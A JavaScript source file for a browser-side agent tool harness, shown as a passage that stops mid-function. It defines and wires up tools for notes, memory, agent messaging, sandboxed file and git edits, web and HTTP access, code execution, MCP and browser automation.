/*
 * Copyright M. Bryce Hudson 2026-2029 All Rights Reserved
 *
 * Unauthorized reproduction, distribution, or transmission of the work is prohibited without prior written permission, with exceptions for brief quotations and specific noncommercial uses under copyright law.
 *
 * BryceFromIndiana@gmail.com
 */

// ============================================
// TOOLS.JS — browser-side tool harness
// ============================================
//
// store is imported for the Auto Approve setting. store.js imports nothing, so
// this cannot close a cycle.
//
// A model can ask for ONE tool per step by replying with bare JSON, e.g.
//   {"tool":"now"}
//   {"tool":"echo","arg":"hello"}
// We run it, feed the result back, and let the model answer in plain text.
// Mirrors the loop in /test/t/snippet.py, but entirely client-side — no
// server executes anything, so this needs none of the shell/RCE machinery.
//
// Two families of tools live here:
//
//   * Local (now, echo, the notes pad, memory) — harmless by construction,
//     they only touch this browser's localStorage.
//   * Sandbox tools, added by bindSandboxTools() and backed by the PHP
//     endpoint at /api/sandbox: web_search, fetch_url, read_file, list_dir,
//     glob_files, grep_code, write_file. These give agents internet access
//     and a filesystem, but they are inert until the operator allowlists
//     directories in Settings. Filesystem paths are jailed server-side, so
//     neither an agent nor this page can reach outside the allowlist, and
//     write_file asks you first.
//
// Nothing here runs arbitrary code or shells out.

import { store } from './store.js?v=321';
import { asText, compactText } from './utils.js?v=321';
import { askApproval, sessionApproved, rememberApproval } from './approveDialog.js?v=321';
import { settingFor } from './agentConfig.js?v=321';
import { trace } from './trace.js?v=321';

const NOTES_KEY = 'router_notes';
const CUSTOM_TOOL_NAME_RE = /^[a-z][a-z0-9_]{0,39}$/;
const MAX_CUSTOM_TOOL_CODE = 20000;
const MAX_CUSTOM_TOOL_DESCRIPTION = 300;
const MAX_CUSTOM_TOOL_INSTRUCTIONS = 4000;
const MAX_CUSTOM_TOOL_ARG = 120;
const MAX_CUSTOM_TOOL_RESULT = 12000;
/**
 * Ceiling for any single tool result fed back to the model. Custom tools had
 * one; built-in and MCP tools did not, so one huge file read or command log
 * could consume the entire context window before the next step.
 */
const MAX_TOOL_OUTPUT_CHARS = 16000;
const CUSTOM_TOOL_NAMES = new Set();
const AsyncFunction = Object.getPrototypeOf(async function () {}).constructor;
const RESERVED_TOOL_NAMES = new Set(Object.getOwnPropertyNames(Object.prototype));

/** Tools the model may request. Each returns a string result. */
export const TOOL_REGISTRY = {
  now: {
    label: 'now',
    arg: '',
    describe: 'Current date and time',
    run: () => new Date().toString(),
  },
  echo: {
    label: 'echo',
    arg: 'text',
    describe: 'Repeat text back unchanged',
    run: arg => String(arg == null ? '' : arg).slice(0, 2000),
  },
  read_note: {
    label: 'read_note',
    arg: 'name',
    describe: 'Read a saved note',
    run: arg => {
      const notes = readNotes();
      const name = String(arg || 'notes').slice(0, 40);
      const entry = notes.find(n => n.name === name);
      return entry ? entry.text.slice(0, 4000) : `(no note named "${name}")`;
    },
  },
  write_note: {
    label: 'write_note',
    arg: 'text',
    describe: 'Append to your notes (asks you first)',
    needsApproval: true,
    run: (arg, name) => {
      const notes = readNotes();
      const n = String(name || 'notes').slice(0, 40);
      const entry = notes.find(x => x.name === n);
      const line = `${new Date().toISOString()} ${String(arg ?? '').slice(0, 2000)}`;
      if (entry) entry.text = (entry.text + '\n' + line).slice(-4000);
      else notes.push({ name: n, text: line });
      writeNotes(notes);
      return 'ok';
    },
  },
  remember: {
    label: 'remember',
    arg: 'fact',
    describe: 'Keep a private note for future sessions (asks you first)',
    needsApproval: true,
    // memory.js needs nothing from this module, but keeping the dependency
    // injected avoids any import-order surprise at startup.
    run: () => 'memory tools are not bound yet',
  },
  share: {
    label: 'share',
    arg: 'fact',
    describe: 'Share a fact with every agent via the collective',
    run: () => 'memory tools are not bound yet',
  },
  recall: {
    label: 'recall',
    arg: '',
    describe: 'List your notes and the collective ones',
    run: () => 'memory tools are not bound yet',
  },
  adopt: {
    label: 'adopt',
    arg: 'id',
    describe: 'Copy a collective note into your own memory',
    run: () => 'memory tools are not bound yet',
  },

  // --- Agent-to-agent comms (see bindAgentComms) ---
  list_agents: {
    label: 'list_agents',
    arg: '',
    describe: 'List the other agents: name, role, model',
    run: () => 'agent comms are not bound yet',
  },
  ask_agent: {
    label: 'ask_agent',
    arg: '{"name":"Worker","question":"..."}',
    describe: 'Ask another agent a question and get their reply now',
    run: () => 'agent comms are not bound yet',
  },
  tell_agent: {
    label: 'tell_agent',
    arg: '{"name":"Worker","message":"..."}',
    describe: 'Send another agent an instruction (no reply)',
    run: () => 'agent comms are not bound yet',
  },
  read_mailbox: {
    label: 'read_mailbox',
    arg: '',
    describe: 'Read instructions other agents sent you',
    run: () => 'agent comms are not bound yet',
  },

  exec: {
    label: 'exec',
    arg: 'argv',
    describe: 'Run one shell command as an argv array, e.g. ["grep","-rn","x","."]',
    needsApproval: true,
    run: () => 'sandbox tools are not bound yet',
  },

  // --- Server-backed tools (see bindSandboxTools) ---
  web_search: {
    label: 'web_search',
    arg: 'query',
    describe: 'Search the internet (DuckDuckGo, no API key)',
    run: () => 'sandbox tools are not bound yet',
  },
  fetch_url: {
    label: 'fetch_url',
    arg: 'url',
    describe: 'Read a web page and get back its text',
    run: () => 'sandbox tools are not bound yet',
  },
  read_file: {
    label: 'read_file',
    arg: 'path',
    describe: 'Read a file on the server (numbered lines)',
    run: () => 'sandbox tools are not bound yet',
  },
  list_dir: {
    label: 'list_dir',
    arg: 'path',
    describe: 'List a directory the sandbox is allowed to read',
    run: () => 'sandbox tools are not bound yet',
  },
  glob_files: {
    label: 'glob_files',
    arg: 'pattern',
    describe: 'Find files by name pattern, e.g. ui/js/**/*.js',
    run: () => 'sandbox tools are not bound yet',
  },
  grep_code: {
    label: 'grep_code',
    arg: 'pattern',
    describe: 'Search file contents for a regular expression',
    run: () => 'sandbox tools are not bound yet',
  },
  write_file: {
    label: 'write_file',
    arg: '{"path":"...","content":"..."}',
    describe: 'Create or edit a file inside the writable sandbox',
    needsApproval: true,
    run: () => 'sandbox tools are not bound yet',
  },

  // --- Familiar editor tools (Claude / Cursor / Aider shape) ---
  // Models are heavily trained on these exact names and argument names, so
  // they use them far more reliably than a bespoke file API. Both reduce to a
  // jailed exact-string edit server-side; the difference is only the dialect.
  str_replace_editor: {
    label: 'str_replace_editor',
    arg: '{"command":"view|create|str_replace|insert","path":"...","old_str":"...","new_str":"...","file_text":"...","insert_line":0,"view_range":[1,40]}',
    describe: 'Anthropic-style file editor: view, create, str_replace, insert',
    needsApproval: true,
    run: () => 'sandbox tools are not bound yet',
  },
  edit_file: {
    label: 'edit_file',
    arg: '{"path":"...","old_string":"...","new_string":"...","replace_all":false}',
    describe: 'Replace an exact string in a file (search/replace edit)',
    needsApproval: true,
    run: () => 'sandbox tools are not bound yet',
  },
  apply_patch: {
    label: 'apply_patch',
    arg: 'patch',
    describe: 'Apply a Codex/GPT V4A patch (*** Begin Patch ... *** End Patch) to add, update, move or delete files',
    needsApproval: true,
    run: () => 'sandbox tools are not bound yet',
  },

  // --- Git, run jailed and shell-free ---
  git: {
    label: 'git',
    arg: '{"args":["status"]}',
    describe: 'Run one git command in the sandbox, e.g. ["diff","HEAD~1"] or ["log","--oneline","-10"]',
    needsApproval: true,
    // Read-only subcommands run without a prompt; anything that writes asks.
    safeWhen: arg => {
      const a = Array.isArray(arg?.args) ? arg.args : (Array.isArray(arg) ? arg : []);
      const sub = String(a[0] || '').toLowerCase();
      return ['status', 'diff', 'log', 'show', 'branch', 'remote', 'ls-files',
        'rev-parse', 'blame', 'shortlog', 'describe', 'tag', 'grep', 'whatchanged',
        'reflog', 'ls-tree'].includes(sub);
    },
    run: () => 'sandbox tools are not bound yet',
  },

  // --- Arbitrary HTTP (API work), not just GET ---
  http_request: {
    label: 'http_request',
    arg: '{"method":"GET","url":"...","headers":{},"body":"..."}',
    describe: 'Make an HTTP request with a method, headers and a body',
    run: () => 'sandbox tools are not bound yet',
  },

  // --- Apply several edits atomically, and commit ---
  multi_edit: {
    label: 'multi_edit',
    arg: '{"edits":[{"path":"...","old_string":"...","new_string":"..."}]}',
    describe: 'Apply several search/replace edits at once, all-or-nothing',
    needsApproval: true,
    run: () => 'sandbox tools are not bound yet',
  },
  git_commit: {
    label: 'git_commit',
    arg: '{"message":"...","paths":["src/app.js"]}',
    describe: 'Stage the given paths (or everything) and commit',
    needsApproval: true,
    run: () => 'sandbox tools are not bound yet',
  },

  // --- Code interpreter (off unless the operator enables it) ---
  run_code: {
    label: 'run_code',
    arg: '{"language":"python|node|bash","code":"..."}',
    describe: 'Run a snippet with an interpreter in the sandbox (no state between calls; files persist)',
    needsApproval: true,
    run: () => 'sandbox tools are not bound yet',
  },

  // --- Planning + reasoning ---
  // Universal in agent frameworks; keeps a long task coherent and gives a
  // reasoning model somewhere to think that is not the answer.
  todo_write: {
    label: 'todo_write',
    arg: '{"todos":[{"content":"...","status":"pending|in_progress|completed"}]}',
    describe: 'Write or update your task list for this session',
    run: arg => {
      const a = (arg && typeof arg === 'object' && !Array.isArray(arg)) ? arg : {};
      const todos = Array.isArray(a.todos) ? a.todos : (Array.isArray(arg) ? arg : []);
      const clean = todos.map(t => ({
        content: String((t && t.content) || '').slice(0, 300),
        status: ['pending', 'in_progress', 'completed'].includes(t && t.status) ? t.status : 'pending',
      })).filter(t => t.content);
      try { store.set('ui.todos', clean); store.emit('todos:changed', clean); } catch { /* no store */ }
      if (!clean.length) return 'todo list cleared';
      const mark = { pending: '[ ]', in_progress: '[~]', completed: '[x]' };
      return clean.map((t, i) => `${mark[t.status]} ${i + 1}. ${t.content}`).join('\n');
    },
  },
  think: {
    label: 'think',
    arg: 'thought',
    describe: 'Reason through the next step before acting (not shown to the user)',
    run: arg => String(arg == null ? ''
      : (typeof arg === 'string' ? arg : JSON.stringify(arg))).slice(0, 4000),
  },

  // --- MCP: tools exposed by operator-configured MCP servers ---
  mcp_list: {
    label: 'mcp_list',
    arg: '{"server":"name"} (omit to list servers)',
    describe: 'List MCP servers, or the tools one MCP server exposes',
    run: () => 'mcp tools are not bound yet',
  },
  mcp_call: {
    label: 'mcp_call',
    arg: '{"server":"name","tool":"toolName","arguments":{}}',
    describe: 'Call a tool on a connected MCP server',
    needsApproval: true,
    run: () => 'mcp tools are not bound yet',
  },

  // --- Browser: the built-in Chrome/Edge screen (Config → Labs → Browser) ---
  // These drive the SAME page the operator sees in the Browser screen, so an
  // agent can log in (with the operator watching) and then act.
  browser_open: {
    label: 'browser_open',
    arg: '{"url":"https://…"}',
    describe: 'Drive the built-in browser — a REAL Chrome/Edge the operator can watch. Open a URL to start; '
      + 'no Playwright/Selenium/extension needed. Call this first.',
    run: () => 'browser tools are not bound yet',
  },
  browser_click: {
    label: 'browser_click',
    arg: '{"selector":"#login"} or {"x":120,"y":340}',
    describe: 'In the built-in browser, click an element (CSS selector) or a point (x,y).',
    run: () => 'browser tools are not bound yet',
  },
  browser_type: {
    label: 'browser_type',
    arg: '{"selector":"#email","text":"…","enter":true}',
    describe: 'In the built-in browser, type into the focused field (focus a CSS selector first if given); '
      + '"enter":true presses Enter to submit.',
    needsApproval: true,
    run: () => 'browser tools are not bound yet',
  },
  browser_read: {
    label: 'browser_read',
    describe: 'In the built-in browser, read the visible text of the current page. '
      + 'Use it after every action to see what happened.',
    run: () => 'browser tools are not bound yet',
  },
  browser_wait: {
    label: 'browser_wait',
    arg: '{"ms":1500}',
    describe: 'In the built-in browser, wait N milliseconds for the page to settle.',
    run: () => 'browser tools are not bound yet',
  },

  // --- Always-on agents ---
  // The stop signal for an autonomous run. A tool rather than a phrase match,
  // because an agent that writes "this is nearly done" should not be taken at
  // its word. _toolLoop recognises the name and ends the turn on the summary.
  declare_goal_complete: {
    label: 'declare_goal_complete',
    arg: '{"summary":"what you finished"}',
    describe: 'Call this when your standing goal is met — it ends your autonomous run',
    run: (_arg, note) => {
      const summary = String(note || '').trim();
      return summary || 'Goal declared complete.';
    },
  },
};

/** Only ever offered to an agent that has a standing goal. */
export const ALWAYS_ON_TOOLS = ['declare_goal_complete'];

/**
 * The built-in browser's tools. Offered to EVERY agent automatically while the
 * Browser feature is on (Config → Labs → Browser), so a model can never claim
 * it lacks browser automation. Harmless when the feature is off — the tools are
 * simply not listed, and the API refuses them anyway.
 */
export const BROWSER_TOOLS = ['browser_open', 'browser_click', 'browser_type', 'browser_read', 'browser_wait'];

const BUILTIN_TOOL_NAMES = new Set(Object.keys(TOOL_REGISTRY));

function normaliseCustomTool(raw) {
  if (!raw || typeof raw !== 'object') return null;
  const name = String(raw.name || '').trim();
  const code = String(raw.code || '').trim();
  return {
    name,
    description: String(raw.description || '').trim().slice(0, MAX_CUSTOM_TOOL_DESCRIPTION),
    instructions: String(raw.instructions || '').trim().slice(0, MAX_CUSTOM_TOOL_INSTRUCTIONS),
    arg: String(raw.arg || '').trim().slice(0, MAX_CUSTOM_TOOL_ARG),
    needsApproval: raw.needsApproval !== false,
    code,
    createdAt: Number(raw.createdAt) || Date.now(),
    updatedAt: Number(raw.updatedAt) || Date.now(),
  };
}

function compileCustomTool(code) {
  return new AsyncFunction('arg', 'ctx', String(code || ''));
}

export function validateCustomTool(raw, ignoreName = '') {
  const tool = normaliseCustomTool(raw);
  if (!tool) return 'Tool definition is empty';
  if (!CUSTOM_TOOL_NAME_RE.test(tool.name)) {
    return 'Name must be lowercase letters, numbers and underscores, starting with a letter';
  }
  if (RESERVED_TOOL_NAMES.has(tool.name)) return `"${tool.name}" is a reserved name`;
  if (tool.name !== ignoreName && (BUILTIN_TOOL_NAMES.has(tool.name)
    || Object.prototype.hasOwnProperty.call(TOOL_REGISTRY, tool.name))) {
    return `A tool named "${tool.name}" already exists`;
  }
  if (!tool.description) return 'Add a description so the model knows when to use it';
  if (!tool.code) return 'Paste the JavaScript body for this tool';
  if (tool.code.length > MAX_CUSTOM_TOOL_CODE) {
    return `JavaScript must be ${MAX_CUSTOM_TOOL_CODE} characters or fewer`;
  }
  try {
    compileCustomTool(tool.code);
  } catch (err) {
    return `JavaScript error: ${err && err.message ? err.message : err}`;
  }
  return '';
}

export function loadCustomTools() {
  for (const name of CUSTOM_TOOL_NAMES) delete TOOL_REGISTRY[name];
  CUSTOM_TOOL_NAMES.clear();
  const saved = store.get('settings.customTools');
  const list = Array.isArray(saved) ? saved : [];
  for (const raw of list) {
    const tool = normaliseCustomTool(raw);
    if (!tool || !CUSTOM_TOOL_NAME_RE.test(tool.name)) continue;
    if (!tool.description || !tool.code || tool.code.length > MAX_CUSTOM_TOOL_CODE) continue;
    if (RESERVED_TOOL_NAMES.has(tool.name) || BUILTIN_TOOL_NAMES.has(tool.name)) continue;
    if (CUSTOM_TOOL_NAMES.has(tool.name)) continue;
    let fn;
    try {
      fn = compileCustomTool(tool.code);
    } catch {
      continue;
    }
    TOOL_REGISTRY[tool.name] = {
      label: tool.name,
      arg: tool.arg,
      describe: tool.description,
      instructions: tool.instructions,
      needsApproval: tool.needsApproval,
      custom: true,
      code: tool.code,
      createdAt: tool.createdAt,
      updatedAt: tool.updatedAt,
      run: async (arg, _note, ctx) => {
        const agent = ctx?.agentId
          ? (store.get('agents') || []).find(a => a.id === ctx.agentId)
          : null;
        const result = await fn(arg, {
          agentId: ctx?.agentId || null,
          agentName: agent?.name || '',
          sessionId: ctx?.sessionId || null,
        });
        return compactText(asText(result === undefined ? 'ok' : result), MAX_CUSTOM_TOOL_RESULT);
      },
    };
    CUSTOM_TOOL_NAMES.add(tool.name);
  }
  store.emit('customTools:changed');
}

export function customToolDefs() {
  return [...CUSTOM_TOOL_NAMES].map(name => TOOL_REGISTRY[name]).filter(Boolean);
}

export function initCustomTools() {
  loadCustomTools();
  let last = JSON.stringify(store.get('settings.customTools') || []);
  const refresh = () => {
    const next = JSON.stringify(store.get('settings.customTools') || []);
    if (next === last) return;
    last = next;
    loadCustomTools();
  };
  store.subscribe('settings', refresh);
  store.subscribe('settings.customTools', refresh);
}

/** The tools that reach the server. Grouped here so the UI can label them. */
export const SANDBOX_TOOLS = [
  'web_search', 'fetch_url', 'read_file', 'list_dir', 'glob_files', 'grep_code', 'write_file',
  'str_replace_editor', 'edit_file', 'apply_patch', 'git', 'git_commit', 'multi_edit', 'run_code', 'http_request',
];

/** Tools that let an agent talk to the other agents. */
export const COMMS_TOOLS = ['list_agents', 'ask_agent', 'tell_agent', 'read_mailbox'];

/** The four memory tools, which ride along automatically with the memory switch. */
const MEMORY_TOOL_NAMES = ['remember', 'recall', 'share', 'adopt'];

/**
 * Every tool a new agent gets, memory tools excluded.
 *
 * New agents are created with all of these ticked. An agent that can only be
 * given filesystem, search or comms powers one checkbox at a time tends to end
 * up with none, and an agent with no tools cannot answer a question about the
 * project it is sitting next to. Agents saved before this existed have no
 * `tools` array at all and are treated the same way; one explicitly set to []
 * stays empty, because that is a deliberate choice.
 */
export function defaultTools() {
  // ALWAYS_ON_TOOLS is excluded deliberately: it is derived from the registry,
  // and a tool that only makes sense with a standing goal would otherwise be
  // offered to every agent as a stray function in the prompt.
  return Object.keys(TOOL_REGISTRY)
    .filter(t => !MEMORY_TOOL_NAMES.includes(t))
    .filter(t => !ALWAYS_ON_TOOLS.includes(t))
    .filter(t => !TOOL_REGISTRY[t]?.custom);
}

/**
 * Wire the agent-to-agent tools. Called once from chat.js, which owns the
 * roster and the ability to actually run another agent.
 *
 * The bridge is deliberately narrow: it can list agents, run one, post a
 * message and read a mailbox. Nothing in here touches the DOM or the network,
 * so an agent cannot summon anything beyond the configured roster.
 *
 * @param {object} bridge
 * @param {Function} bridge.roster   () => [{id,name,role,model,active}]
 * @param {Function} bridge.ask      (targetId, question, ctx) => Promise<string>
 * @param {Function} bridge.post     (targetId, fromId, message) => void
 * @param {Function} bridge.mailbox  (agentId) => [{from,message}]
 */
export function bindAgentComms(bridge) {
  // Resolve by id or by name, case-insensitively, ignoring a leading "the".
  // Models write "worker", "Worker" and "the worker" interchangeably, and a
  // miss here would read as "no such agent" when one plainly exists.
  const resolve = (raw, roster, me) => {
    const want = String(raw ?? '').trim().replace(/^the\s+/i, '').toLowerCase();
    const others = roster.filter(a => a.id !== me);
    return others.find(a => a.id.toLowerCase() === want)
      || others.find(a => String(a.name || '').toLowerCase() === want)
      || others.find(a => want && (
        String(a.name || '').toLowerCase().includes(want)
        || want.includes(String(a.name || '').toLowerCase())
      ))
      || null;
  };

  const rosterOf = () => (bridge.roster ? bridge.roster() : []) || [];
  const meOf = ctx => (ctx && ctx.agentId) || null;

  const notFound = raw =>
    `No agent called "${String(raw ?? '').trim()}" is available.\n`
    + TOOL_REGISTRY.list_agents.run('', null, {});

  TOOL_REGISTRY.list_agents.run = (_arg, _note, ctx) => {
    const me = meOf(ctx);
    const rows = rosterOf().map(a => {
      const bits = [`${a.name} (${a.id})`, a.role || 'no role', a.model || 'no model'];
      if (a.id === me) bits.push('<- this is you');
      else if (a.active === false) bits.push('inactive');
      return `- ${bits.join(' | ')}`;
    });
    return rows.length ? `Agents you can talk to:\n${rows.join('\n')}` : 'There are no other agents.';
  };

  TOOL_REGISTRY.ask_agent.run = async (arg, _note, ctx) => {
    const spec = (arg && typeof arg === 'object') ? arg : { name: arg, question: _note };
    const target = resolve(spec.name, rosterOf(), meOf(ctx));
    if (!target) return notFound(spec.name);
    const question = String(spec.question ?? '').trim();
    if (!question) return 'error: ask_agent needs a "question" to send';
    return await bridge.ask(target.id, question, ctx);
  };

  TOOL_REGISTRY.tell_agent.run = (arg, _note, ctx) => {
    const spec = (arg && typeof arg === 'object') ? arg : { name: arg, message: _note };
    const target = resolve(spec.name, rosterOf(), meOf(ctx));
    if (!target) return notFound(spec.name);
    const message = String(spec.message ?? '').trim();
    if (!message) return 'error: tell_agent needs a "message" to send';
    bridge.post(target.id, meOf(ctx), message);
    return `Instruction sent to ${target.name}. They read it with read_mailbox. `
      + 'Use ask_agent instead if you need an answer now.';
  };

  TOOL_REGISTRY.read_mailbox.run = (_arg, _note, ctx) => {
    const id = meOf(ctx);
    const items = bridge.mailbox(id) || [];
    // Draining rather than peeking: an instruction is consumed once. Leaving it
    // at the front of the mailbox would make the model re-read and re-act on
    // the same order on every later step.
    if (items.length) bridge.consume?.(id);
    if (!items.length) return 'Your mailbox is empty.';
    return `Instructions for you:\n${items.map(m => `- from ${m.from}: ${m.message}`).join('\n')}`;
  };
}

/**
 * Wire the memory tools to memory.js. Called once at startup by app.js.
 * Without this the four tools return a clear error instead of silently
 * pretending to have saved something.
 */
export function bindMemoryTools(api) {
  const idOf = ctx => (ctx && ctx.agentId) || 'unknown';
  TOOL_REGISTRY.remember.run = (arg, _n, ctx) => {
    const text = String(arg == null ? '' : arg).trim();
    if (!text) return 'error: nothing to remember';
    return api.remember(idOf(ctx), text)
      ? `saved privately: ${text.slice(0, 80)}`
      : 'error: could not save (storage full?)';
  };
  TOOL_REGISTRY.share.run = (arg, _n, ctx) => {
    const text = String(arg == null ? '' : arg).trim();
    if (!text) return 'error: nothing to share';
    return api.share(idOf(ctx), text)
      ? `shared with the collective: ${text.slice(0, 80)}`
      : 'error: could not share (storage full?)';
  };
  TOOL_REGISTRY.recall.run = (_arg, _n, ctx) => {
    const { mine, shared } = api.recallFor(idOf(ctx));
    const parts = [];
    if (mine.length) parts.push('your notes:\n' + mine.slice(-25).map(e => `- ${asText(e.text)}`).join('\n'));
    if (shared.length) parts.push('collective:\n' + shared.slice(-15).map(e => `- ${asText(e.text)}`).join('\n'));
    return parts.length ? parts.join('\n') : '(you have no saved notes)';
  };
  TOOL_REGISTRY.adopt.run = (arg, _n, ctx) => {
    const id = String(arg == null ? '' : arg).trim();
    return api.adopt(idOf(ctx), id)
      ? 'adopted into your private notes'
      : 'error: no collective note with that id (use recall to list them)';
  };
}

/**
 * Wire the sandbox tools to the PHP backend. Called once at startup by app.js.
 *
 * Each entry formats the API's JSON into the plain text a model reasons over
 * better than it does over raw JSON. Failures are returned as text (never
 * thrown) so the loop can show the model what went wrong and let it retry.
 *
 * @param {object} api the ApiClient from api.js
 */
export function bindSandboxTools(api) {
  const lines = rows => rows.map(r => (typeof r === 'string' ? r : r.join(' '))).join('\n');
  const scopeOf = ctx => (ctx && ctx.sandboxRoot) || undefined;

  TOOL_REGISTRY.web_search.run = async (arg) => {
    const res = await api.sandbox('search', { query: String(arg ?? ''), limit: 8 });
    const results = res.results || [];
    if (!results.length) return `no results for "${arg}"`;
    return `${results.length} results for "${res.query}":\n`
      + lines(results.map((r, i) =>
        `${i + 1}. ${r.title}\n   ${r.url}\n   ${r.snippet || ''}`));
  };

  TOOL_REGISTRY.fetch_url.run = async (arg) => {
    const res = await api.sandbox('fetch', { url: String(arg ?? ''), max_chars: 20000 });
    return `URL: ${res.url} (HTTP ${res.status}${res.title ? ', ' + res.title : ''})\n\n${res.text}`;
  };

  TOOL_REGISTRY.read_file.run = async (arg, _note, ctx) => {
    // Accept "path" or "path 20-80" so large files can be read in slices.
    const raw = String(arg ?? '').trim();
    const m = /^(.*?)\s+(\d+)\s*-\s*(\d+)$/.exec(raw);
    const path = m ? m[1].trim() : raw;
    const range = m ? `${m[2]}-${m[3]}` : undefined;
    const res = await api.sandbox('read', { path, range, root: scopeOf(ctx) });
    const head = `${res.path} — ${res.bytes} bytes${res.truncated ? ', truncated' : ''}`;
    return `${head}\n\n${res.content}`;
  };

  TOOL_REGISTRY.list_dir.run = async (arg, _note, ctx) => {
    const a = String(arg ?? '').trim();
    const res = await api.sandbox('list', a ? { path: a, limit: 200, root: scopeOf(ctx) } : { root: scopeOf(ctx) });
    if (!res.entries) return `allowed directories:\n${(res.dirs || []).join('\n')}`;
    return lines(res.entries.map(e =>
      e.type === 'dir' ? `${e.name}/` : `${e.name}  (${e.size} bytes)`));
  };

  TOOL_REGISTRY.glob_files.run = async (arg, _note, ctx) => {
    const res = await api.sandbox('glob', { pattern: String(arg ?? ''), scope: scopeOf(ctx) });
    if (!res.count) return `no files match "${arg}"`;
    return `${res.count} matches:\n${res.matches.join('\n')}`;
  };

  TOOL_REGISTRY.grep_code.run = async (arg, _note, ctx) => {
    const res = await api.sandbox('grep', { pattern: String(arg ?? ''), max_matches: 60, scope: scopeOf(ctx) });
    if (!res.count) return `no matches for /${res.pattern}/ in ${res.files_scanned} files`;
    return `${res.count} matches:\n` + lines(res.matches.map(m =>
      `${m.rel}:${m.line}: ${m.text}`));
  };

  TOOL_REGISTRY.write_file.run = async (arg, name, ctx) => {
    // The model may send an object, or a "path" with "content" beside it.
    let path = null;
    let content = null;
    let mode = 'write';
    if (arg && typeof arg === 'object') {
      path = arg.path;
      content = arg.content;
      mode = arg.mode || 'write';
    } else {
      path = String(arg ?? '');
      content = name != null ? String(name) : '';
    }
    if (!path) return 'error: write_file needs a "path" and a "content"';
    if (content == null || content === '') return 'error: write_file needs non-empty "content"';
    const res = await api.sandbox('write', { path: String(path), content, mode, root: scopeOf(ctx) });
    return `wrote ${res.bytes_written} bytes${res.appended ? ' (appended)' : ''} to ${res.path}`;
  };

  // Claude/SWE-agent editor dialect: view / create / str_replace / insert.
  // The argument names (old_str/new_str/file_text/insert_line/view_range) are
  // the ones those models were trained on, so the spelling is deliberate.
  TOOL_REGISTRY.str_replace_editor.run = async (arg, _note, ctx) => {
    const a = (arg && typeof arg === 'object' && !Array.isArray(arg)) ? arg : { command: 'view', path: String(arg ?? '') };
    const command = String(a.command || 'view').toLowerCase();
    const path = String(a.path || '');
    if (!path) return 'error: str_replace_editor needs a "path"';
    const root = scopeOf(ctx);
    if (command === 'view') {
      const range = Array.isArray(a.view_range) && a.view_range.length === 2
        ? `${a.view_range[0]}-${a.view_range[1]}` : undefined;
      const res = await api.sandbox('read', { path, range, root });
      return `${res.path} — ${res.bytes} bytes${res.truncated ? ', truncated' : ''}\n\n${res.content}`;
    }
    if (command === 'create') {
      const res = await api.sandbox('write', { path, content: String(a.file_text ?? ''), mode: 'write', root });
      return `created ${res.path} (${res.bytes_written} bytes)`;
    }
    if (command === 'str_replace') {
      const old = String(a.old_str ?? '');
      if (!old) return 'error: str_replace needs "old_str"';
      const res = await api.sandbox('str_replace', { path, old, new: String(a.new_str ?? ''), replace_all: !!a.replace_all, root });
      return `edited ${res.path} (${res.replaced} replacement${res.replaced === 1 ? '' : 's'})`;
    }
    if (command === 'insert') {
      const res = await api.sandbox('insert', {
        path, line: Number(a.insert_line ?? 0), text: String(a.new_str ?? a.file_text ?? ''), root,
      });
      return `inserted at ${res.path} after line ${res.inserted_after} (now ${res.lines} lines)`;
    }
    return `error: unknown command "${command}" (use view, create, str_replace or insert)`;
  };

  // Cursor/Aider edit dialect: path + old_string + new_string.
  TOOL_REGISTRY.edit_file.run = async (arg, _note, ctx) => {
    const a = (arg && typeof arg === 'object' && !Array.isArray(arg)) ? arg : {};
    const path = String(a.path || '');
    const old = String(a.old_string ?? a.old_str ?? '');
    if (!path) return 'error: edit_file needs a "path"';
    if (!old) return 'error: edit_file needs "old_string"';
    const res = await api.sandbox('str_replace', {
      path, old, new: String(a.new_string ?? a.new_str ?? ''), replace_all: !!a.replace_all, root: scopeOf(ctx),
    });
    return `edited ${res.path} (${res.replaced} replacement${res.replaced === 1 ? '' : 's'})`;
  };

  // Codex/GPT V4A patch: one call can touch several files.
  TOOL_REGISTRY.apply_patch.run = async (arg, _note, ctx) => {
    const patch = (arg && typeof arg === 'object' && !Array.isArray(arg))
      ? String(arg.patch ?? arg.input ?? arg.text ?? '')
      : String(arg ?? '');
    if (!patch.trim()) return 'error: apply_patch needs the patch text';
    const res = await api.sandbox('apply_patch', { patch, root: scopeOf(ctx) });
    const rows = (res.applied || []).map(r =>
      r.op === 'update'
        ? `updated ${r.path}${r.moved_to ? ' -> ' + r.moved_to : ''} (${r.hunks} hunk${r.hunks === 1 ? '' : 's'})`
        : r.op === 'add' ? `added ${r.path} (${r.lines} lines)`
          : `deleted ${r.path}`);
    return rows.join('\n') || `applied ${res.count} change(s)`;
  };

  // Git, jailed and shell-free. Accepts {args:[...]}, a bare array, or a string.
  TOOL_REGISTRY.git.run = async (arg, _note, ctx) => {
    let args = [];
    if (Array.isArray(arg)) args = arg;
    else if (arg && typeof arg === 'object') {
      args = Array.isArray(arg.args) ? arg.args
        : (arg.command ? [arg.command, ...(Array.isArray(arg.arguments) ? arg.arguments : [])] : []);
    } else if (typeof arg === 'string') {
      args = arg.trim().split(/\s+/);
    }
    args = args.map(String).filter(Boolean);
    if (!args.length) return 'error: git needs args, e.g. {"args":["status"]}';
    const res = await api.sandbox('git', { args, cwd: scopeOf(ctx), root: scopeOf(ctx) });
    const out = [];
    if (res.stdout) out.push(res.stdout.trimEnd());
    if (res.stderr) out.push('[stderr] ' + res.stderr.trim());
    if (!out.length) out.push('(no output)');
    out.push(`[exit ${res.exit}]`);
    return out.join('\n');
  };

  TOOL_REGISTRY.http_request.run = async (arg) => {
    const a = (arg && typeof arg === 'object' && !Array.isArray(arg)) ? arg : { url: String(arg ?? '') };
    if (!a.url) return 'error: http_request needs a "url"';
    const res = await api.sandbox('http', {
      method: a.method || 'GET',
      url: String(a.url),
      headers: (a.headers && typeof a.headers === 'object') ? a.headers : {},
      body: a.body ?? a.data ?? null,
      max_chars: 20000,
    });
    const head = `HTTP ${res.status}${res.content_type ? ' ' + res.content_type : ''} — ${res.url}${res.truncated ? ' (truncated)' : ''}`;
    return `${head}\n\n${res.body}`;
  };

  // MCP: list servers / their tools, and call one.
  TOOL_REGISTRY.mcp_list.run = async (arg) => {
    const a = (arg && typeof arg === 'object' && !Array.isArray(arg)) ? arg : {};
    const server = String(a.server || a.name || (typeof arg === 'string' ? arg : '')).trim();
    if (!server) {
      const res = await api.mcpServers();
      const list = res.servers || [];
      return list.length
        ? 'MCP servers:\n' + list.map(s => `- ${s.id} (${s.transport})`).join('\n')
        : 'No MCP servers are configured.';
    }
    const res = await api.mcpTools(server);
    const tools = res.tools || [];
